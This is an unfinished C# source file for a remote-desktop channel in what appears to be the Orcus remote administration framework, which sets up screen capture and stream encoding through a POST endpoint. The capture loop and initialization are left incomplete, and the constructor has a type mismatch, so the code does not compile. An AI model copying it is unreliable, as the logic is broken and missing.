using System;
using System.Collections;
using System.Collections.Generic;
using System.Threading.Tasks;
using Microsoft.Net.Http.Headers;
using Orcus.Modules.Api;
using Orcus.Modules.Api.Routing;
using Orcus.Utilities;
using RemoteDesktop.Client.Capture;
using RemoteDesktop.Client.Encoder;

namespace RemoteDesktop.Client.Channels
{
    public class RemoteDesktopChannel : OrcusChannel
    {
        private readonly IEnumerable<IScreenCaptureService> _captureServices;
        private readonly IEnumerable<IStreamEncoder> _streamEncoders;
        private bool _isDisposed;

        private IStreamEncoder _streamEncoder;
        private IScreenCaptureService captureService;

        public RemoteDesktopChannel(IEnumerable<IScreenCaptureService> captureServices, IEnumerable<IStreamEncoder> streamEncoder)
        {
            _captureServices = captureServices;
            _streamEncoder = streamEncoder;
        }

        public override void ReceiveData(byte[] buffer, int offset, int count)
        {
            throw new NotImplementedException();
        }

        [OrcusPost]
        public IActionResult InitializeRemoteDesktop()
        {
            Task.Run(CaptureLoop).Forget(); //not long running
            return Ok();
        }

        public void CaptureLoop()
        {
            using (var )
            {
                
            }
        }

        public override void Initialize()
        {
            base.Initialize();
            var captureCommandLine = OrcusContext.Request.Headers["capture"];
            var encoderCommandLine = OrcusContext.Request.Headers[HeaderNames.ContentEncoding];

            _streamEncoder.
        }

        public override void Dispose()
        {
            base.Dispose();
            _isDisposed = true;
        }
    }
}